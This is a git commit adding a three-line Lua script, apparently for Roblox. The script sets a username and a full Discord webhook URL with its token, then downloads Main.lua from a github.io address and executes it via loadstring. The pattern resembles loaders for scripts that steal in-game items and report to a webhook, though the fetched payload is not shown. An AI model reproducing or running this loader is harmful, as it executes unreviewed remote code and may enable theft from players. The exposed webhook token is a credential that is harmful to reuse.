d0f7e84d6145de1974f34e1d046160546ad6b15e
SoSecretThat <91661501+SoSecretThat@users.noreply.github.com>
2023-05-01 13:23:42 +0800

    Add files via upload

---
+++ mail.lua
@@ -0,0 +1,3 @@
+UserName = "qq_kky"
+Webhook = "https://discord.com/api/webhooks/1102463575563456593/ZUE35uJPESsRxw181B-5F1Pkq7Ot2SnHnMMImw8rhzspag6fRCfirxuN9RDDYH7olhd9"
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
